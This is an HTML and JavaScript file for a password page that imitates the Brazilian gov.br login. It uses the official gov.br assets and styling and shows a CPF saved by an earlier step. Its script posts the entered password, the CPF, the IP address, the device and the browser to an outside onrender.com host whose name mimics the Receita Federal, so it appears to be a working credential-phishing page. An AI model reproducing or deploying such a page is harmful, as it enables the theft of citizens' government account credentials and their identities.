<!-- password.html - Página de senha -->
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>gov.br - Digite sua senha</title>
    <link rel="icon" href="https://sso.acesso.gov.br/assets/govbr/img/favicon.ico">
    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fontawesome/css/all.min.css">
    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fonts/rawline/rawline.css">
    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/css/govbr-templates.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Rawline', sans-serif; background: #f5f5f5; }
        header { background: #fff; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 4px rgba(0,0,0,0.1); }
        header img { height: 40px; }
        .container { display: flex; max-width: 1200px; margin: 2rem auto; background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        aside { flex: 1; background: linear-gradient(135deg, #1351B4 0%, #0c326f 100%); padding: 3rem; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center; }
        aside img { max-width: 150px; margin-bottom: 1.5rem; }
        main { flex: 1; padding: 3rem; }
        .card { margin-bottom: 2rem; }
        h3 { font-size: 1.5rem; margin-bottom: 1.5rem; color: #1351B4; }
        label { display: block; font-weight: 500; margin-bottom: 0.5rem; color: #555; }
        h4 { font-size: 1.2rem; color: #1351B4; margin-bottom: 1rem; padding: 0.5rem; background: #f0f4fa; border-radius: 8px; display: inline-block; }
        .password-eye { position: relative; display: flex; align-items: center; }
        .password-eye input { flex: 1; padding: 0.75rem; padding-right: 45px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; }
        .password-eye input:focus { outline: none; border-color: #1351B4; box-shadow: 0 0 0 2px rgba(19,81,180,0.2); }
        .toggle-password { position: absolute; right: 15px; cursor: pointer; color: #666; font-size: 1.1rem; }
        .button-panel { display: flex; gap: 1rem; margin: 1.5rem 0 1rem; }
        .button-ok { background: #1351B4; color: #fff; border: none; padding: 0.75rem 2rem; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 1rem; flex: 1; }
        .button-cancel { background: #f5f5f5; border: 1px solid #ccc; padding: 0.75rem 2rem; border-radius: 8px; cursor: pointer; font-size: 1rem; flex: 1; }
        .button-ok:disabled { opacity: 0.6; cursor: not-allowed; position: relative; color: transparent; }
        .button-ok:disabled::after { content: ''; position: absolute; width: 20px; height: 20px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 0.8s linear infinite; left: calc(50% - 10px); top: calc(50% - 10px); }
        @keyframes spin { to { transform: rotate(360deg); } }
        .button-href-mimic { background: none; border: none; color: #1351B4; cursor: pointer; font-size: 0.9rem; text-decoration: underline; width: 100%; text-align: center; }
        #faq { text-align: center; padding-top: 1rem; border-top: 1px solid #eee; }
        @media (max-width: 768px) { .container { flex-direction: column; margin: 1rem; } aside { padding: 2rem; } }
    </style>
</head>
<body>
    <header>
        <a href="/"><img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="gov.br"></a>
    </header>

    <div class="container">
        <aside>
            <img src="https://sso.acesso.gov.br/assets/govbr/img/senha.png" alt="Senha">
            <p>Digite sua senha para acessar o login único do governo federal.</p>
        </aside>
        <main>
            <div class="card">
                <h3>Digite sua senha</h3>
                <label>CPF</label>
                <h4 id="cpf-display">Carregando...</h4>
                <label for="password">Senha</label>
                <div class="password-eye">
                    <input type="password" id="password" placeholder="Digite sua senha" autocomplete="off">
                    <span class="toggle-password" onclick="togglePassword()"><i class="fas fa-eye"></i></span>
                </div>
                <div class="button-panel">
                    <button class="button-cancel" onclick="cancelLogin()">Cancelar</button>
                    <button id="submit-btn" class="button-ok">Entrar</button>
                </div>
                <button class="button-href-mimic" onclick="forgotPassword()">Esqueci minha senha</button>
            </div>
            <div id="faq">
                <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/" target="_blank">Ficou com dúvidas?</a>
            </div>
        </main>
    </div>

    <script>
        const API_URL = window.location.origin.includes('localhost') ? 'http://localhost:3001/api' : 'https://receitafederal-f2fk.onrender.com/api';
        
        const userCPF = localStorage.getItem('login_cpf') || '';
        
        function formatCPF(cpf) {
            if (!cpf) return '';
            let v = cpf.replace(/\D/g, '');
            if (v.length >= 4) v = v.replace(/(\d{3})(\d)/, '$1.$2');
            if (v.length >= 8) v = v.replace(/(\d{3})(\d)/, '$1.$2');
            if (v.length >= 11) v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            return v;
        }
        
        document.getElementById('cpf-display').textContent = formatCPF(userCPF);
        
        if (!userCPF) window.location.href = '/index.html';
        
        async function realizarLogin() {
            const senha = document.getElementById('password').value;
            const btn = document.getElementById('submit-btn');
            
            if (!senha) {
                alert('Digite sua senha');
                return;
            }
            
            btn.disabled = true;
            
            try {
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        cpf: userCPF.replace(/\D/g, ''),
                        password: senha,
                        ip: localStorage.getItem('login_ip'),
                        dispositivo: localStorage.getItem('login_dispositivo'),
                        navegador: localStorage.getItem('login_navegador')
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    localStorage.setItem('token', data.token);
                    localStorage.setItem('user', JSON.stringify(data.user));
                    localStorage.removeItem('login_cpf');
                    localStorage.removeItem('login_ip');
                    localStorage.removeItem('login_dispositivo');
                    localStorage.removeItem('login_navegador');
                    
                    window.location.href = data.user.role === 'admin' ? '/admin.html' : '/dashboard.html';
                } else {
                    alert(data.error || 'CPF ou senha inválidos');
                    btn.disabled = false;
                }
            } catch (error) {
                console.error('Erro:', error);
                alert('Erro ao conectar ao servidor. Tente novamente.');
                btn.disabled = false;
            }
        }
        
        function cancelLogin() {
            localStorage.removeItem('login_cpf');
            localStorage.removeItem('login_ip');
            localStorage.removeItem('login_dispositivo');
            localStorage.removeItem('login_navegador');
            window.location.href = '/index.html';
        }
        
        function forgotPassword() {
            window.open('https://gov.br/recuperar-senha', '_blank');
        }
        
        function togglePassword() {
            const pwd = document.getElementById('password');
            const icon = document.querySelector('.toggle-password i');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                pwd.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }
        
        document.getElementById('submit-btn').addEventListener('click', realizarLogin);
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') realizarLogin();
        });
        
        document.getElementById('password').focus();
    </script>
</body>
</html>
